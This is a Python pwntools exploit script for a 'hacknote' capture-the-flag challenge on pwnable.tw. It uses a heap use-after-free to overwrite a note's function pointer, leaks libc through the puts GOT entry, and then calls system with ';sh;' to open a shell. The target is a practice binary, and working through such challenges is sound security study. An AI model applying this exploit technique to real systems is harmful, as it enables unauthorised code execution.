#!/usr/bin/env python3

from pwn import *

DWORD = 4
context.terminal = ['tmux', 'splitw', '-h']

class Advasary:
    def __init__(self):
        self.libc = ELF('./given/libc_32.so.6')
        self.elf = ELF('./pwninit/hacknote_patched')

        NUM_NOTES = 5
        self.notes = [None] * NUM_NOTES

    def conn(self):
        if args.REMOTE:
            return remote('chall.pwnable.tw', 10102)

        ld = ELF('./pwninit/ld-2.23.so')
        p = process([ld.path, self.elf.path], env={
            'LD_PRELOAD': self.libc.path
        })
        if args.GDB:
            gdb.attach(p, '\n'.join([
                # 'b *0x8048863', # free(note->content)
                'b *0x804893d', # print_note: function-ptr call
                'b *0x8048a91', # exit
            ]))
        return p

    def get_note_slot(self):
        for i in range(len(self.notes)):
            if self.notes[i] is None:
                return i

        log.error('out of notes')
        quit()

    def add_note(self, size: int, content: bytes):
        self.p.sendlineafter(b'Your choice :', b'1')
        self.p.sendafter(b'Note size :', str(size).encode())
        self.p.sendafter(b'Content :', content)
        note_idx = self.get_note_slot()
        self.notes[note_idx] = (size, content)
        return note_idx

    def delete_note(self, index):
        self.p.sendlineafter(b'Your choice :', b'2')
        self.p.sendlineafter(b'Index :', str(index).encode())

    def print_note(self, index):
        self.p.sendlineafter(b'Your choice :', b'3')
        self.p.sendlineafter(b'Index :', str(index).encode())
        msg = self.p.recvuntil(b'----------------------')
        return msg

    def exploit(self):
        self.p = self.conn()
        note0 = self.add_note(8, b'aaaaaa')
        note1 = self.add_note(32, b'bbbbbb')
        self.delete_note(note0)
        self.delete_note(note1)

        func_print_note = 0x804862b
        got_puts = 0x804a024
        note2 = self.add_note(8, p32(func_print_note) + p32(got_puts))
        leak = self.print_note(note0)
        libc_leak = u32(leak[:4])
        log.info(f'found libc leak {hex(libc_leak)}')
        self.libc.address = libc_leak - self.libc.symbols['puts']
        log.info(f'found libc base: {hex(self.libc.address)}')

        binsh = next(self.libc.search(b'/bin/sh\x00'))
        self.delete_note(note2)

        libc_execve = self.libc.symbols['system']
        note3 = self.add_note(8, p32(libc_execve) + b';sh;')

        # print_note() but uses costumed commands
        self.p.sendlineafter(b'Your choice :', b'3')
        self.p.sendafter(b'Index :', p32(binsh))

        self.p.interactive()

if __name__ == '__main__':
    adv = Advasary()
    adv.exploit()
